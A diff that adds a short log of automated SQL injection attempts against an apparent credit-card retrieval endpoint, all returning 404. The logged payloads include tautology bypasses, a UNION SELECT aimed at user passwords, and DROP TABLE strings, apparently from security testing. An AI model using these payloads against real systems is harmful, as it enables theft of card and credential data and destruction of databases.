@@ -1,0 +1,14 @@
+2025-05-01 04:47:40,375 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - WARNING - POST /retreive_cards ['1-800-123', '1-800-456', '1-800-789'] not found: 404 Not Found
+2025-05-01 04:47:40,384 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: 1') OR '1'='1' --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,388 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: 1') OR TRUE --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,392 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: ') OR TRUE --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,396 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: 1') OR '1'='1' OR ?=1 --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,401 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: 1) OR '1'='1' --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,405 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: user1@example.com' OR '1'='1, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,410 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: 1 OR '1'='1', got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,415 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: admin'--, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,419 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: user2@example.com') UNION SELECT password FROM users --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,423 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: user2@example.com') UNION SELECT password FROM users --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,427 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: anything" OR ""=", got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,431 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: '; DROP TABLE users; --, got 404 {"error": "No matching credit cards found"}
+2025-05-01 04:47:40,435 - 74c84c4afb631a0f314cd6d23928f3f494a3f2d2fc093931319ef83590c2a5bc - INFO - trying vector: '; DROP TABLE services; --, got 404 {"error": "No matching credit cards found"}
